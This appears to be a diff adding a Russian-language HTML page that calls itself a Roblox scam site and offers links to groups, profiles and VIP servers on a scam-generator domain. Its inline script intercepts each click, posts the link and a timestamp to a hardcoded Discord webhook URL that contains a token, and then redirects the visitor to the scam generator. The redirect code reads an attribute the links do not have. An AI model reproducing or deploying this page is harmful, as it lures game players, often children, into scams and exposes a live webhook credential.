@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Скам-сайт Роблокс</title>
+    <style>
+        body {
+            background-color: #f2f2f2;
+            font-family: Arial, sans-serif;
+            text-align: center;
+        }
+        h1 {
+            color: #ff3366;
+        }
+        p {
+            color: #333333;
+        }
+        ul {
+            list-style-type: none;
+            padding: 0;
+        }
+        li {
+            margin-bottom: 10px;
+        }
+        a {
+            display: inline-block;
+            padding: 10px 20px;
+            background-color: #ff3366;
+            color: #ffffff;
+            text-decoration: none;
+            border-radius: 5px;
+            transition: background-color 0.3s;
+        }
+        a:hover {
+            background-color: #cc0044;
+        }
+        img {
+            width: 200px;
+            height: 200px;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <h1>Добро пожаловать на скам-сайт Роблокс!</h1>
+    <p>Нажмите на ссылки ниже, чтобы получить доступ к группам, профилям игроков и VIP-серверам:</p>
+    <ul>
+        <li><a href="https://realscamgenerator.ru/generator?link=group1">Скам-ссылка на группу 1</a></li>
+        <li><a href="https://realscamgenerator.ru/generator?link=group2">Скам-ссылка на группу 2</a></li>
+        <li><a href="https://realscamgenerator.ru/generator?link=profile1">Скам-ссылка на профиль 1</a></li>
+        <li><a href="https://realscamgenerator.ru/generator?link=profile2">Скам-ссылка на профиль 2</a></li>
+        <li><a href="https://realscamgenerator.ru/generator?link=vipserver">Скам-ссылка на VIP-сервер</a></li>
+    </ul>
+    <img src="https://www.meme-arsenal.com/memes/be8144c3d5a92c62b6c8be8a227e55a8.jpg" alt="Roblox Image">
+
+    <script>
+        var webhookURL = "https://discord.com/api/webhooks/1108664429119291454/-6wHehbUSCNYemFapCR9pQFaSW5Pmd3lIF_Rwpj14Dd37AJIg81A-AN6H1Pb8faK1eYJ";
+
+        function sendWebhookData(data) {
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+                .then(response => {
+                    console.log('Data sent to webhook:', data);
+                })
+                .catch(error => {
+                    console.error('Error sending data to webhook:', error);
+                });
+        }
+
+        var links = document.querySelectorAll('a');
+
+        links.forEach(link => {
+            link.addEventListener('click', function(event) {
+                event.preventDefault();
+
+                var data = {
+                    link: link.href,
+                    timestamp: Date.now()
+                };
+
+                sendWebhookData(data);
+
+                setTimeout(function() {
+                    window.location.href = "https://realscamgenerator.ru/generator?link=" + link.getAttribute('data-link');
+                }, 1000);
+            });
+        });
+    </script>
+</body>
+</html>
